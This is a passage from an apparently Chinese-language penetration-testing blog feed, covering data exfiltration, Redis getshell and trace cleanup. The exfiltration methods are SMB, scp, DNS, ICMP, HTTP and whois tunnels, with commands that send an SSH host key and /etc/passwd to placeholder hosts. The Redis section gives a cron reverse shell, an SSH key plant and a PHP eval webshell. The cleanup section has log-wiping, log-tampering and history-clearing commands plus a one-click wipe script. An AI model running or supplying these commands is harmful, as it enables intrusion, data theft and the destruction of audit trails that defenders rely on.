armasm"><span class="hljs-symbol">service</span> vsftpd start<br>访问<span class="hljs-built_in">ip</span>:<span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><p>利用smb回传</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cd /etc/samba<br>vi smb.conf<br>文件内添加:<br>[<span class="hljs-keyword">share</span>]<br>    <span class="hljs-type">path</span> =/home/<span class="hljs-keyword">share</span><br>    available = yes<br>    browsealbe = yes<br>    <span class="hljs-built_in">public</span>= <span class="hljs-keyword">no</span><br>    writable = yes<br>cd /home<br>mkdir <span class="hljs-keyword">share</span><br>chmod -R <span class="hljs-number">777</span> <span class="hljs-keyword">share</span><br>useradd <span class="hljs-keyword">share</span><br>smbpasswd -a <span class="hljs-keyword">share</span><br>service smbd <span class="hljs-keyword">restart</span><br>访问\\ip<br></code></pre></td></tr></table></figure><p>利用scp回传</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">scp localfilename root@xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span>:filename<br></code></pre></td></tr></table></figure><h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p>1.命令行</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-constructor">$(<span class="hljs-params">xxd</span> -<span class="hljs-params">p</span> -<span class="hljs-params">c</span> 10 <span class="hljs-params">ssh_host_ecdsa_key</span>)</span>;<span class="hljs-keyword">do</span> sleep <span class="hljs-number">1</span>s<span class="hljs-operator"> &amp;&amp; </span>nslookup $i.xxx.com xx.xx.xx.xx;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>2.dnscat2、dns2tcp</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">攻击机（server）：<br>安装<br>apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">ruby</span> <span class="hljs-keyword">ruby</span>-dev git <span class="hljs-keyword">make</span> g++ rubygems<br>gem <span class="hljs-keyword">update</span> --<span class="hljs-built_in">system</span><br>gem install bundler<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/iagox86/dnscat2.git<br><span class="hljs-keyword">cd</span> dnscat2/server<br>bundle install<br>设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址，运行<br><span class="hljs-keyword">ruby</span> ./dnscat2.rb dns.uuzdaisuki.<span class="hljs-keyword">com</span> --<span class="hljs-keyword">no</span>-cache<br><br>受害者（linux）安装<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/iagox86/dnscat2.git<br><span class="hljs-keyword">cd</span> dnscat2/client/<br><span class="hljs-keyword">make</span><br>受害者（windows）安装<br>http<span class="hljs-variable">s:</span>//downloads.skullsecurity.org/dnscat2/ 下载win32.zip的dnascat2后解压<br><br>将server中产生的secret复制下来，运行<br>./dnscat --dns domain=dns.uuzdaisuki.<span class="hljs-keyword">com</span> --secret=xxxxxxxxxxxxxxxxxxxxx<br>session -i <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>详情参考：</p><p><a href="http://uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/">http://uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/</a></p><h2 id="ping隧道"><a href="#ping隧道" class="headerlink" title="ping隧道"></a>ping隧道</h2><p>1.命令行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> a.txt | xxd -p -c <span class="hljs-number">1</span>|xargs -n <span class="hljs-number">1</span> -I &#x27;&#123;&#125;&#x27; ping -c <span class="hljs-number">1</span> -s <span class="hljs-number">56</span> -p &#x27;&#123;&#125;&#x27; xx.xx.xx.xx<br></code></pre></td></tr></table></figure><p>2.pingtunnel</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://www.<span class="hljs-keyword">cs</span>.uit.<span class="hljs-keyword">no</span>/~daniels/PingTunnel/<br>ptunnel -<span class="hljs-keyword">p</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">100.232</span> -<span class="hljs-keyword">lp</span> <span class="hljs-number">8888</span> -da <span class="hljs-number">192.168</span>.<span class="hljs-number">118.131</span> -<span class="hljs-keyword">dp</span> <span class="hljs-number">3389</span><br>    -<span class="hljs-keyword">p</span> 指定ICMP隧道另一端的IP<br>    -<span class="hljs-keyword">lp</span>：指定本地监听的端口<br>    -da：指定要转发的目标机器的IP<br>    -<span class="hljs-keyword">dp</span>：指定要转发的目标机器的端口<br>    -<span class="hljs-keyword">x</span>：指定连接密码<br></code></pre></td></tr></table></figure><p>3.icmpsh展开cc通道：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">攻击者机器部署icmpsh：<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/inquisb/icmpsh.git<br>sysctl -<span class="hljs-keyword">w</span> net.ipv4.icmp_echo_ignore_all=<span class="hljs-number">1</span><br><span class="hljs-keyword">cd</span> icmpsh<br><span class="hljs-keyword">syntax</span>: ./icmpsh_m.<span class="hljs-keyword">py</span> &lt;attacker’s-IP&gt; <span class="hljs-symbol">&lt;target-IP&gt;</span><br>./icmpsh_m.<span class="hljs-keyword">py</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.106</span><br>受害者机器：<br><span class="hljs-keyword">syntax</span>: icmpsh.<span class="hljs-keyword">exe</span> -t &lt;Kali IP&gt;<br>icmpsh.<span class="hljs-keyword">exe</span> -t <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span><br></code></pre></td></tr></table></figure><p>4.icmptunnel</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs awk">受害者主机：<br>安装icmptunnel<br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jamesbarlow/i</span>cmptunnel.git<br>cd icmptunnel<br>make<br>禁用ICMP echo回复<br>echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/icmp_echo_ignore_all<br>服务端模式启动icmptunnel，并且给新的隧道接口分配一个IP地址<br>./icmptunnel -s<br>Ctrlz<br>bg<br><span class="hljs-regexp">/sbin/i</span>fconfig tun0 <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> netmask <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>ifconfig<br><br>攻击者主机：<br>安装icmptunnel<br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jamesbarlow/i</span>cmptunnel.git<br>cd icmptunnel<br>make<br>禁用ICMP echo回复<br>echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/icmp_echo_ignore_all<br>运行<br>./icmptunnel <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span><br>ctrl z<br><span class="hljs-regexp">/sbin/i</span>fconfig tun0 <span class="hljs-number">10.0</span>.<span class="hljs-number">0.2</span> netmask <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><br></code></pre></td></tr></table></figure><h2 id="http隧道"><a href="#http隧道" class="headerlink" title="http隧道"></a>http隧道</h2><p>1.reGeorg</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/sensepost/</span>reGeorg.git<br>pip install urllib3<br>将对应页面上传到目标服务器上<br>并在本地监听<br>python reGeorgSocksProxy.py ‐p <span class="hljs-number">8080</span> ‐l <span class="hljs-number">192.168</span>.<span class="hljs-number">1.5</span> ‐u <br>访问目标<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.119</span>/tunnel.aspx<br></code></pre></td></tr></table></figure><p>2.ABPTTS</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">安装<br>apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">python</span>-dev  build-essential libssl-dev libffi-dev  libxml2-dev libxslt1-dev zlib1g-dev <span class="hljs-keyword">python</span>-pip<br> pip install pycrypto<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/nccgroup/ABPTTS.git<br><span class="hljs-keyword">cd</span> ABPTTS/<br>生成payload<br><span class="hljs-keyword">python</span> abpttsfactory.<span class="hljs-keyword">py</span> ‐<span class="hljs-keyword">o</span> webshell<br>传到目标靶机<br>端口转发<br><span class="hljs-keyword">python</span> abpttsclient.<span class="hljs-keyword">py</span> ‐<span class="hljs-keyword">c</span> webshell/config.txt ‐<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.1.119/abptts.aspx&quot;</span> ‐<span class="hljs-keyword">f</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.5</span>:<span class="hljs-number">33389</span>/<span class="hljs-number">192.168</span>.<span class="hljs-number">1.119</span>:<span class="hljs-number">3389</span><br>让攻击机的<span class="hljs-number">33389</span>端口流量转发到<span class="hljs-number">3389</span>，通过HTTPS服务<br></code></pre></td></tr></table></figure><h2 id="whois隧道"><a href="#whois隧道" class="headerlink" title="whois隧道"></a>whois隧道</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">失陷机：<br>root<span class="hljs-title">@kali</span>:~# whois -h <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> -p <span class="hljs-number">4444</span> `cat /etc/passwd | base<span class="hljs-number">64</span>`<br>接受机：<br>root<span class="hljs-title">@kali</span>:/tmp# nc -l -v -p <span class="hljs-number">4444</span> | sed <span class="hljs-string">&quot;&quot;</span>s/ //g<span class="hljs-string">&quot;&quot;</span> | base<span class="hljs-number">64</span> -d<br></code></pre></td></tr></table></figure><h2 id="社交平台或工具"><a href="#社交平台或工具" class="headerlink" title="社交平台或工具"></a>社交平台或工具</h2><p>利用腾讯qq、微信等工具回传</p><h2 id="代码托管"><a href="#代码托管" class="headerlink" title="代码托管"></a>代码托管</h2><p>利用github回传</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">通过一个匿名邮箱注册github账户，并创建一个空仓库<br>mdkir upload<br><span class="hljs-keyword">cd</span> upload<br>git config --<span class="hljs-keyword">global</span> user.name “user.name”<br>git config --<span class="hljs-keyword">global</span> user.email “user.email”<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/xxx/xxx.git<br><span class="hljs-keyword">cp</span> -r <span class="hljs-keyword">file</span> upload<br>git <span class="hljs-built_in">add</span> *<br>git commit -<span class="hljs-keyword">m</span> <span class="hljs-string">&quot;update&quot;</span><br>git push -<span class="hljs-keyword">u</span> origin master<br></code></pre></td></tr></table></figure><h2 id="云储存"><a href="#云储存" class="headerlink" title="云储存"></a>云储存</h2><p>利用百度网盘等网盘类工具回传</p><h2 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h2><p>利用邮件外发回传</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据回传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis未授权getshell的多种方式</title>
    <link href="/2020/12/24/redis%E6%9C%AA%E6%8E%88%E6%9D%83getshell%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <url>/2020/12/24/redis%E6%9C%AA%E6%8E%88%E6%9D%83getshell%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>redis未授权访问或弱密码，是常见的重要入口点之一，由于其可以写文件的特性，就产生了多种getshell的方式。</p><h2 id="redis连接方式"><a href="#redis连接方式" class="headerlink" title="redis连接方式"></a>redis连接方式</h2><p>下载需要的版本的redis-cli：</p><p><a href="http://download.redis.io/releases/">http://download.redis.io/releases/</a></p><p>安装使用：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tar zxvf redis-x<span class="hljs-selector-class">.x</span>.x（版本）<span class="hljs-selector-class">.tar</span>.gz<br>cd redis-x<span class="hljs-selector-class">.x</span>.x<br>make<br>cp <span class="hljs-attribute">src</span>/redis-cli /usr/bin/<br>./redis-cli -h host -<span class="hljs-selector-tag">p</span> port -<span class="hljs-selector-tag">a</span> password<br></code></pre></td></tr></table></figure><h2 id="写定时任务crontabs"><a href="#写定时任务crontabs" class="headerlink" title="写定时任务crontabs"></a>写定时任务crontabs</h2><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span><span class="hljs-keyword">var</span><span class="hljs-operator">/</span>spool<span class="hljs-operator">/</span>cron<span class="hljs-operator">/</span>crontabs<br>config <span class="hljs-keyword">set</span> dbfilename root<br><span class="hljs-keyword">set</span> <span class="hljs-operator">-</span><span class="hljs-operator">.-</span> <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/1551 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br>save<br>nc <span class="hljs-operator">-</span>v <span class="hljs-operator">-</span>l <span class="hljs-operator">-</span>p <span class="hljs-number">1551</span><br></code></pre></td></tr></table></figure><h2 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h2><p>本地生成公私钥对</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure><p>连接redis，将刚才生成的公钥要在下面命令中使用</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>.ssh<span class="hljs-operator">/</span><br>config <span class="hljs-keyword">set</span> dbfilename authorized_keys<br><span class="hljs-keyword">set</span> x <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDUi1zueNmGKBCLMxRTHW5+VZ0Z0G5FjGapaV3NhzIcUQcHl+U9KkYoCIIXgXUrZc5xBBzaS+jdefiJobx2PXEKKssaGMBGFJ9vC+iRUYjoqCExzSXE6Lv52nqfp2JgKL2wu1yC/b5alIfVrj4N8PgDtLiEKz2DMwpXP8VPz0UUXpMgx4ASFnLYP5QB2mYY2LRvRkoydGnc61GAJiwCzSczx3kXCwAmZXGnS37892NKlFNshghqXsVhSnaHYHZNNtcRj2yD2poo0ZAHOJFT0TOcyj2HpMr821l6WxpjpeTAYnFeSAB8s9P9atC+RmyIZBg8w6cOpvL99Vf+LpcnRld4aDHZ4dKeXQjntQVdBtObqtaUen64cTpLvq+mYbBsoprRgyaHI+7NPWNm4HxkGzl3rYK3ujnbAmy2iwu4J9Skil4v5bL+i1lMWQovBU03AxOztx2MA7jUmyciKT+fp6pszWqN8okmQs78Cujp9IFJYgd6NfH3IjTBmaogkvnDEH8= root@kali<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br>save<br></code></pre></td></tr></table></figure><h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><p>根据实际情况寻找web路径，写webshell并访问</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">config set dir /var/www/html</span><br><span class="xml">config set dbfilename shell.php</span><br><span class="xml">set xx &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span><br><span class="xml">save</span><br></code></pre></td></tr></table></figure><h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><p>redis主从复制漏洞无需目标root权限启动redis，可以反弹一个redis权限的shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/n0b0dyCN/</span>redis-rogue-server.git<br>./redis-rogue-server.py --rhost <span class="hljs-number">172.18</span>.<span class="hljs-number">2.177</span> --lhost <span class="hljs-number">170.170</span>.<span class="hljs-number">64.14</span><br></code></pre></td></tr></table></figure><h2 id="windows下思路"><a href="#windows下思路" class="headerlink" title="windows下思路"></a>windows下思路</h2><ul><li><p>写入webshell</p></li><li><p>写入启动项</p></li><li><p>Windows2003写入MOF</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>后渗透阶段清理痕迹方式总结</title>
    <link href="/2020/11/11/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2020/11/11/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透完成之后，为了减少被发现和追溯的概率，攻击者有必要清除自己的攻击痕迹，本文分别对windows和linux上清理痕迹的方式做一个总结。</p><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>有远程桌面权限时手动删除日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志<br></code></pre></td></tr></table></figure><p>wevtutil</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">wevtutil <span class="hljs-keyword">el</span>             列出系统中所有日志名称<br>wevtutil <span class="hljs-keyword">cl</span> <span class="hljs-built_in">system</span>      清理系统日志<br>wevtutil <span class="hljs-keyword">cl</span> application 清理应用程序日志<br>wevtutil <span class="hljs-keyword">cl</span> security    清理安全日志<br></code></pre></td></tr></table></figure><p>meterperter自带清除日志功能</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">clearev</span>     清除windows中的应用程序日志、系统日志、安全日志<br></code></pre></td></tr></table></figure><p>清除recent</p><p>在文件资源管理器中点击“查看”-&gt;“选项”-&gt;在常规-&gt;隐私中点击”清除”按钮</p><p>或直接打开C:\Users\Administrator\Recent并删除所有内容</p><p>或在命令行中输入del /f /s /q “%userprofile%\Recent*.*</p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="清除命令历史记录"><a href="#清除命令历史记录" class="headerlink" title="清除命令历史记录"></a>清除命令历史记录</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">histroy -r          <span class="hljs-comment">#删除当前会话历史记录</span><br><span class="hljs-keyword">history</span> -c          <span class="hljs-comment">#删除内存中的所有命令历史</span><br>rm <span class="hljs-string">.bash_history</span>   <span class="hljs-comment">#删除历史文件中的内容</span><br>HISTZISE=0          <span class="hljs-comment">#通过设置历史命令条数来清除所有历史记录</span><br></code></pre></td></tr></table></figure><h3 id="在隐蔽的位置执行命令"><a href="#在隐蔽的位置执行命令" class="headerlink" title="在隐蔽的位置执行命令"></a>在隐蔽的位置执行命令</h3><p>使用vim打开文件执行命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">:<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">history</span>=0<br>:!command<br></code></pre></td></tr></table></figure><h3 id="linux日志文件"><a href="#linux日志文件" class="headerlink" title="linux日志文件"></a>linux日志文件</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stata">/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp 记录现在登入的用户<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp 记录用户所有的登入和登出<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/lastlog 记录每一个用户最后登入时间<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp 记录错误的登入尝试<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/auth.<span class="hljs-keyword">log</span> 需要身份确认的操作<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure 记录安全相关的日志信息<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/maillog 记录邮件相关的日志信息<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/message 记录系统启动后的信息和错误日志<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/cron 记录定时任务相关的日志信息<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/spooler 记录UUCP和<span class="hljs-keyword">news</span>设备相关的日志信息<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/<span class="hljs-keyword">boot</span>.<span class="hljs-keyword">log</span> 记录守护进程启动和停止相关的日志消息<br></code></pre></td></tr></table></figure><p>完全删除日志文件：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sas">cat /dev/<span class="hljs-meta">null</span> &gt; <span class="hljs-meta">filename</span><br>: &gt; <span class="hljs-meta">filename</span><br>&gt; <span class="hljs-meta">filename</span><br>echo <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-meta">filename</span><br>echo &gt; <span class="hljs-meta">filename</span><br></code></pre></td></tr></table></figure><p>针对性删除日志文件：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sas">删除当天日志<br>sed  -i <span class="hljs-string">&#x27;/当天日期/&#x27;</span>d  <span class="hljs-meta">filename</span><br></code></pre></td></tr></table></figure><p>篡改日志文件：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">将所有<span class="hljs-number">170.170.64</span>.<span class="hljs-number">17</span>ip替换为<span class="hljs-number">127.0.0.1</span><br>sed -i &#x27;s/<span class="hljs-number">170.170.64.17</span>/<span class="hljs-number">127.0.0.1</span>/g&#x27;<br></code></pre></td></tr></table></figure><p>一键清除脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/bash</span><br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/syslog<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/messages<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/httpd/access_log<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/httpd/error_log<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/xferlog<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/secure<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/auth.log<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/user.log<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/wtmp<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/lastlog<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/btmp<br><span class="hljs-built_in">echo</span> &gt; /var/run/utmp<br>rm ~/./bash_history<br><span class="hljs-built_in">history</span> -c<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>痕迹清理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见web系统默认口令总结</title>
    <link href="/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/"/>
